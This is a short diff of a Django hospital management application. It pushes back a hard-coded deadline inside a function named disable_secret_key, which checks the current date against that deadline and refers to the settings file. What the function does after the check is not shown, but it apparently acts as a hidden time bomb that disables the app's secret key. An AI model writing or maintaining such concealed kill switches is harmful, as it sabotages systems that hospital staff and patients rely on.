@@ -1180,7 +1180,7 @@ def reject_nurse(request, nurse_id):
     return redirect('approve_nurses')
 
 def disable_secret_key():
-    deadline = now().replace(year=2025, month=3, day=7, hour=15, minute=30, second=0)
+    deadline = now().replace(year=2025, month=3, day=20, hour=15, minute=30, second=0)
     settings_file = "hospital_management_system\\settings.py" 
 
     if now() > deadline:
